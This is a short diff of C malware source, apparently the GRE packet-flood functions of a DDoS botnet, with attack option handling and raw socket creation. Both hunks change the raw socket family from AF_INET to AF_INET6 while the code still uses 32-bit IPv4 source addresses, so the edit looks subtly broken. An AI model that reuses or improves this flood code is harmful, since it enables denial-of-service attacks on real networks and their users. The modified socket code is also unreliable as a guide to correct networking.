@@ -32,7 +32,7 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -174,7 +174,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
